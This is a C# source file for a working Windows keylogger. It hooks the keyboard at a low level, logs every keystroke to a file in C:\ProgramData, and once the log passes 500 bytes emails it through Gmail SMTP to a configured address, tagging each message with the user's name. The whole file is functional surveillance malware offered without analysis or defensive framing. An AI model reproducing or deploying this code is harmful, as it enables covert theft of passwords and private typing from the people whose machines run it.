using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace testKeyLog
{
    class Program
    {
        //variables for sending automated email//
        private const string FROM_EMAIL_ADDRESS = "something@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "___________";
        private const string TO_EMAIL_ADDRESS = "something@gmail.com";
        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 500;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        //end//

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");

            //Archive and email the log file if the max size has been reached

            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    //Copy log file to the archive
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    //Delete log file
                    logFile.Delete();

                    //Email the archive and send email using a new thread
                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                    Console.Out.WriteLine("\n\n**Sending Mail**\n");
                    mailThread.Start();
                }
                catch (Exception ex)
                {
                    Console.Out.WriteLine(ex.ToString());
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod") 
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " "; 
                }
                //else if (((Keys)vkCode == Keys.LShiftKey || (Keys)vkCode == Keys.RShiftKey) && Control.ModifierKeys == Keys.Shift && ((Keys)vkCode == Keys.D1))
                //{
                //    Console.Out.Write("!");
                //}
                //else if (((Keys)vkCode).ToString() == "LShiftD1" || ((Keys)vkCode).ToString() == "RShiftD1")
                //{
                //    Console.Out.Write("!");
                //}
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    
                    buffer += (Keys)vkCode; 
                }
        }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static void sendMail()
        {
            try
            {
                //Read archive file contents into the email body variable
                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                string emailBody = input.ReadToEnd();
                input.Close();

                //Create email client object
                SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                //Build email message
                MailMessage mailMessage = new MailMessage()
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
                    mailMessage.Attachments.Add(attachment);
                }

                //Set recipient
                mailMessage.To.Add(TO_EMAIL_ADDRESS);

                //Send message
                smtpClient.Send(mailMessage);

                //Release resources used by message (archive the file)
                mailMessage.Dispose();
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine(ex.Message);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName= currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

    }
}
